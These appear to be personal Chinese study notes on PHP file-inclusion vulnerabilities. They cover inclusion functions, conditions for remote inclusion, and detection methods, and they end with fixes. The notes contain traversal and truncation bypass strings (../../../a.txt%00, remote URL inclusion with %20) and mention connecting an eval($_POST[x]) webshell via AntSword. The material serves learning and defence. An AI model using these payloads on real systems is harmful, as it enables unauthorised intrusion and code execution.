**文件操作安全** 分为 文件上传、文件包含、文件下载、文件读取

文件被解析：文件包含（如果文件是平台可以解析的脚本语言编写的，就解析，不行就显示

显示源代码，文件读取

提示文件下载，文件下载



![image-20230503201129897](E:\AppData\Roaming\Typora\typora-user-images\image-20230503201129897.png)

![image-20230503201207206](E:\AppData\Roaming\Typora\typora-user-images\image-20230503201207206.png)

## 文件上传



## 文件包含

远程包含条件：php.ini中allow_url_fopen和allow_url_include为on

把文件以脚本的方式执行

### 文件包含函数

##### PHP

include & require & include_once & require_once

| 函数         |                  |                                          |
| ------------ | ---------------- | ---------------------------------------- |
| include      | 报错也会继续执行 |                                          |
| require      | 报错就不执行     |                                          |
| include_once |                  | 只包含一次（本文件中只会包含一次目标文件 |
| require_once |                  | 只包含一次                               |

```text
PHP：include() 、include_once()、require()、require_once()
JSP/Servlet：ava.io.file()、java.io.filereader()
ASP：include file、include virtual
```





### 脚本

![image-20230503201346086](E:\AppData\Roaming\Typora\typora-user-images\image-20230503201346086.png)

eg. 1.txt里有php语句phpinfo()
include.php里include函数可以包含文件
访问/include.php?filename=1.txt即可执行phpinfo()

如果是eval($_POST[x])之类，可以用蚁剑连

/include.php?filename=1.txt，变量名x

### 检测

#### 白盒

#### 黑盒

- 工具扫描

- 公开漏洞

- 手工看参数值及功能点

看url中接的参数是否是文件名，然后看通过文件包含访问和直接访问，显示的结果是否相同，相同则说明为文件包含

看这个网页的功能

### 类型

##### 本地包含

包含服务器本地文件

- 有限制

在文件名后加.html，限制文件类型

include($filename."html")

绕过：

1.%00截断（php版本有限制）

?filename=../../../a.txt%00

2.长度截断（windows文件名长于256生效，Linux长于4096）

?filename=../../../a.txt......................................................................................................................................

- 无限制

?filename=../../../a.txt

##### 远程包含

可以包含网络上的文件，危害大于本地包含

php的远程包含开关：allow_url_include，on表允许

- 有限制

include($filename."html")

绕过：

?filename=http://www.xxx.com/a.txt%20

%20，%23，？等

- 无限制

?filename=http://www.xxx.com/a.txt

### 利用

如果有限制，怎么用一些伪协议来绕过

![image-20230503201129897](E:\AppData\Roaming\Typora\typora-user-images\脚本语言与伪协议.webp)

![image-20230503201129897](E:\AppData\Roaming\Typora\typora-user-images\php与伪协议.webp)



### 修复

如果一定要传参，那就**对参数值进行检测**

不需要传参，那就**固定文件**，写死include('1.txt')，或者**固定后缀**，这样黑盒很难测试出来

**上WAF**，看流量



